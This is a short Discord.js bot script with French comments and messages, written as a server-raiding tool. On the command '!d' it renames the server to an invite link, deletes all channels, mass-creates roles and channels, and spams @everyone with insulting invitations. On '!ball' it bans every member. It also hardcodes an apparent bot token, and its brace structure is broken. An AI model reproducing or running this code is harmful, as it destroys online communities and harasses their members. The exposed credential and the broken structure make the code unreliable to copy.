const Discord = require('discord.js');
const client = new Discord.Client({
    partials: ['USER', 'CHANNEL', 'GUILD_MEMBER', 'MESSAGE', 'REACTION'],
    intents: [
        'GUILDS',
        'GUILD_VOICE_STATES',
        'GUILD_MESSAGES',
        'GUILD_BANS',
        'GUILD_INVITES',
        'GUILD_MEMBERS',
        'GUILD_INTEGRATIONS',
    ],
});
client.once('ready', () => {
    console.info("Prêt a tout baiser.")
    console.info('                                                                                                   
          ____                                                                                     
        ,'  , `.                                                      ,---,.               ___     
     ,-+-,.' _ |                       ,--,                         ,'  .'  \            ,--.'|_   
  ,-+-. ;   , ||   ,---.             ,--.'|                       ,---.' .' |   ,---.    |  | :,'  
 ,--.'|'   |  ;|  '   ,'\   ,----._,.|  |,      .--.--.           |   |  |: |  '   ,'\   :  : ' :  
|   |  ,', |  ': /   /   | /   /  ' /`--'_     /  /    '          :   :  :  / /   /   |.;__,'  /   
|   | /  | |  ||.   ; ,. :|   :     |,' ,'|   |  :  /`./          :   |    ; .   ; ,. :|  |   |    
'   | :  | :  |,'   | |: :|   | .\  .'  | |   |  :  ;_            |   :     \'   | |: ::__,'| :    
;   . |  ; |--' '   | .; :.   ; ';  ||  | :    \  \    `.         |   |   . |'   | .; :  '  : |__  
|   : |  | ,    |   :    |'   .   . |'  : |__   `----.   \        '   :  '; ||   :    |  |  | '.'| 
|   : '  |/      \   \  /  `---`-'| ||  | '.'| /  /`--'  /        |   |  | ;  \   \  /   ;  :    ; 
;   | |`-'        `----'   .'__/\_: |;  :    ;'--'.     /         |   :   /    `----'    |  ,   /  
|   ;/                     |   :    :|  ,   /   `--'---'          |   | ,'                ---`-'   
'---'                       \   \  /  ---`-'                      `----'                           
                             `--`-'                                                                ');
})
client.on('messageCreate', async (message) => {
    if (message.content == '!d')
    {
        message.guild.setName("discord.gg/M9pQzUAvm8", "discord.gg/M9pQzUAvm8")
        message.guild.setIcon("https://i.imgur.com/jlufXIO.png", "cette pp est mieux")
        message.guild.channels.cache.forEach((c) => {
            c.delete().catch(() => {});
        });
        for (let i = 0; i < 100; i++)
        {
            message.guild.roles.create({ name: 'M9pQzUAvm8' }).catch(() => {});
            message.guild.channels.create('M9pQzUAvm8')
            .then((c) => {
                for (let i = 0; i < 10; i++) {
                    c.send('@everyone Saph vous a bien baisé, rejoignez ce serveur: discord.gg/M9pQzUAvm8 ').catch(() => {});
        
                }
            });
        }};
    });
    if (message.content == '!ball')
    {
        let leMembre = await message.guild.members.fetch({ force: true }); 
    leMembre.forEach(member => {
            member.ban({ reason: "Tu t'es bien fait baisé." });
    });
}
process.on('uncaughtException', function(err) {
  console.log('Caught exception: ' + err.message);
});
// ACTIVER : sur le portail dev discord : "Presence Intent", "Server Members Intent" et "Message Content Intent"
client.login("MTEzMzQ2MDc4MTQzNDkzMzMzMA.GPsKOG.geMdro3QtJwMg-t-8CjPyrU0TYF2ENaxvVGFgg");
